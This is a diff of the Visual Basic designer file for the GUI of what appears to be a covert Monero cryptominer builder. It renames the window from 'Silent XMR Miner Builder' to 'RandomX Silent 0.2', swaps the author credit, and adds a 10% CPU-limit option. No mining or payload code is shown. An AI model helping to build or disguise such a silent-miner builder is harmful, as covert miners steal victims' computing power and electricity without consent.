@@ -1,4 +1,4 @@
-﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
 Partial Class Form1
     Inherits System.Windows.Forms.Form
 
@@ -98,9 +98,9 @@ Partial Class Form1
         Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
         Me.MephForm1.Name = "MephForm1"
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
-        Me.MephForm1.SubHeader = "By Zeroclust"
+        Me.MephForm1.SubHeader = "- H3x404 -"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "SilentCPU"
+        Me.MephForm1.Text = "RandomX-Silent 0.2"
         '
         'MephTabcontrol2
         '
@@ -666,7 +666,7 @@ Partial Class Form1
         Me.txtMaxCPU.FormattingEnabled = True
         Me.txtMaxCPU.ItemHeight = 16
         Me.txtMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
-        Me.txtMaxCPU.Items.AddRange(New Object() {"25%", "50%", "75%", "100%"})
+        Me.txtMaxCPU.Items.AddRange(New Object() {"10%", "25%", "50%", "75%", "100%"})
         Me.txtMaxCPU.Location = New System.Drawing.Point(73, 12)
         Me.txtMaxCPU.Name = "txtMaxCPU"
         Me.txtMaxCPU.Size = New System.Drawing.Size(60, 22)
@@ -725,7 +725,7 @@ Partial Class Form1
         Me.Name = "Form1"
         Me.Opacity = 0.95R
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
-        Me.Text = "Silent XMR Miner Builder"
+        Me.Text = "RandomX Silent 0.2"
         Me.TransparencyKey = System.Drawing.Color.Fuchsia
         Me.MephForm1.ResumeLayout(False)
         Me.MephTabcontrol2.ResumeLayout(False)
